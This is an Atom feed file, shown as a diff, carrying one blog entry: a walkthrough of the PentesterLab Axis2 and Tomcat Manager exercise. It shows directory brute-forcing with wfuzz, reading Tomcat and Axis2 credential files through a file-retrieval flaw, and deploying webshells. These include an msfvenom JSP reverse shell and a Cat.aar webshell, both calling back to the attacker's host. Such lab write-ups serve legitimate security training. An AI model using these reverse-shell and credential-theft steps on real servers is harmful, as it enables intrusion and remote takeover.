@@ -1,0 +1,99 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: tomcat | F4l13n5n0w]]></title>
+  <link href="http://f4l13n5n0w.github.io/blog/categories/tomcat/atom.xml" rel="self"/>
+  <link href="http://f4l13n5n0w.github.io/"/>
+  <updated>2015-10-03T09:41:43-04:00</updated>
+  <id>http://f4l13n5n0w.github.io/</id>
+  <author>
+    <name><![CDATA[F4l13n5n0w]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[[PentesterLab] Axis2 Web service and Tomcat Manager]]></title>
+    <link href="http://f4l13n5n0w.github.io/blog/2015/05/30/pentesterlab-axis2-web-service-and-tomcat-manager/"/>
+    <updated>2015-05-30T08:16:43-04:00</updated>
+    <id>http://f4l13n5n0w.github.io/blog/2015/05/30/pentesterlab-axis2-web-service-and-tomcat-manager</id>
+    <content type="html"><![CDATA[<p>&ldquo;This course details the exploitation of an issue in an Axis2 Web service and how using this issue it is possible to retrieve arbitrary files. Then using this, we will see how an attacker can retrieve Tomcat users' file to access the Tomcat Manager and gain commands execution on the server.&rdquo; &ndash; <font color="green"><em>PentesterLab</em></font></p>
+
+<p>More information and ISO download please check <a href="https://www.pentesterlab.com/exercises/axis2_and_tomcat_manager/">here</a>. The official <a href="https://www.pentesterlab.com/exercises/axis2_and_tomcat_manager/course">course</a> is highly recommanded to read.</p>
+
+<p>Difficulty: 3 / 5</p>
+
+<!-- more -->
+
+
+<h2>Walkthrough</h2>
+
+<p>Based on the result of NMAP scan, tcp port 80 is open.</p>
+
+<p>Access tcp port 80 and use DirBuster/wfuzz to brute force hidden path and found &ldquo;/axis2&rdquo;:</p>
+
+<p>wfuzz command to burte force hidden path:
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt &ndash;hc 404 &lt;a href="http://10.10.10.129/FUZZ">http://10.10.10.129/FUZZ&lt;/a> 2>/dev/null</span></code></pre></td></tr></table></div></figure></p>
+
+<p><img src="/downloads/Axis2_Web_Tomcat/1.png"></p>
+
+<p>Due to axis2&rsquo;s ProxyService has information retrieving vulnerability, exploit it and find users' passwords information.</p>
+
+<p>Here are two methods to upload webshell.</p>
+
+<h3>Method 1</h3>
+
+<p>Retrieving Tomcat manager configuration to get login credentials.</p>
+
+<p>In Debian Linux, the tomcat configuration file <code>tomcat-users.xml</code> has default location: <font color="red"><em>/etc/tomcat6/tomcat-users.xml</em></font></p>
+
+<p><img src="/downloads/Axis2_Web_Tomcat/2.png"></p>
+
+<p>From <code>tomcat-users.xml</code> file, the tomcat manager-gui login password can be found: <font color="red"><em>manager / !mp0ss!bl32gu355</em></font></p>
+
+<p>Then login tomcat manager from the URL <code>http://10.10.10.129/manager/html</code> to upload and deploy JSP webshell in WAR file.</p>
+
+<p>Use msfvenom to generate JSP reverse shell and build the war file using <code>jar</code>:</p>
+
+<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>$ mkdir webshell
+</span><span class='line'>$ cd webshell
+</span><span class='line'>$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.10.131 LPORT=4444 -f raw > sh4.jsp
+</span><span class='line'>$ jar -cvf ../webshell.jar *</span></code></pre></td></tr></table></div></figure></p>
+
+<p>Use the following URL to trigger reverse shell connect back to my Kali on port 4444:</p>
+
+<p><code>http://10.10.10.129/webshell/sh4.jsp</code></p>
+
+<p><img src="/downloads/Axis2_Web_Tomcat/3.png"></p>
+
+<h3>Method 2</h3>
+
+<p>Retrieving Axis2 configuration to get login credentials.</p>
+
+<p>In Debian Linux, the axis2 configuration file <code>axis2.xml</code> has default location: <font color="red"><em>/var/lib/tomcat6/webapps/axis2/WEB-INF/conf/axis2.xml</em></font></p>
+
+<p><img src="/downloads/Axis2_Web_Tomcat/4.png"></p>
+
+<p>From <code>axis2.xml</code> file, the axis2 admin login password can be found: <font color="red">admin / axis2</font></p>
+
+<p>Then login axis2 admin page from the URL <code>http://10.10.10.129/axis2/axis2-admin/</code> to upload and deploy axis2 webshell in AAR file.</p>
+
+<p>Here I use <code>Cat.aar</code> <a href="https://github.com/tennc/webshell/tree/master/other/cat.aar">axis2 webshell</a>, upload and deploy it as axis2 service.</p>
+
+<p><img src="/downloads/Axis2_Web_Tomcat/5.png"></p>
+
+<p>Then use the following URL to trigger reverse shell connect back to my Kali on port 5555:</p>
+
+<p><code>http://10.10.10.129/axis2/services/Cat/shell?host=10.10.10.131&amp;port=5555</code></p>
+
+<p><img src="/downloads/Axis2_Web_Tomcat/6.png"></p>
+]]></content>
+  </entry>
+  
+</feed>
